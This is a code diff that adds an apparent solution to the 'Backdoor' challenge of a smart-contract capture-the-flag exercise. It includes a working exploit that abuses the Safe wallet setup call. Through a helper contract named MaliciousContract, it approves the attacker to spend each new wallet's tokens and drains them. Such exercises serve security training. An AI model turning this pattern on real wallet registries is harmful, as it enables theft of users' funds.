@@ -70,7 +70,47 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        MaliciousContract malicious = new MaliciousContract(address(token), player);
+
+        address[] memory _owners = new address[](1);
+        address to = address(malicious); //address(walletRegistry);
+        bytes memory data = abi.encodeWithSignature("transfer()");
+        uint256 _threshold = 1;
+        address fallbackHandler = address(0); //address(token);
+        address paymentToken = address(0);
+        uint256 payment = 0;
+
+        // setup(address[] calldata _owners, uint256 _threshold, address to, bytes calldata data, address fallbackHandler, address paymentToken, uint256 payment, address payable paymentReceiver)
+        for (uint256 i = 0; i < users.length; i++) {
+            _owners[0] = users[i];
+            address payable paymentReceiver = payable(users[i]);
+            bytes memory initializer = abi.encodeWithSelector(
+                // "setup(address[],uint256,addressto,bytes,address,address,uint256,address)",
+                Safe.setup.selector,
+                _owners,
+                _threshold,
+                to,
+                data,
+                fallbackHandler,
+                paymentToken,
+                payment,
+                paymentReceiver
+            );
+
+            // walletFactory.createProxyWithNonce(address(singletonCopy), initializer, 0);
+
+            //     function createProxyWithCallback(
+            //     address _singleton,
+            //     bytes memory initializer,
+            //     uint256 saltNonce,
+            //     IProxyCreationCallback callback
+            // )
+
+            address proxy =
+                address(walletFactory.createProxyWithCallback(address(singletonCopy), initializer, 0, walletRegistry));
+
+            token.transferFrom(address(proxy), recovery, 10e18);
+        }
     }
 
     /**
@@ -92,5 +132,22 @@ contract BackdoorChallenge is Test {
 
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+contract MaliciousContract {
+    DamnValuableToken immutable token;
+    address immutable player;
+
+    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
+
+    constructor(address _token, address _player) {
+        player = _player;
+        token = DamnValuableToken(_token);
+    }
+
+    function transfer() external payable {
+        // token.transfer(msg.sender, token.balanceOf(address(this)));
+        token.approve(player, 10e18);
     }
 }
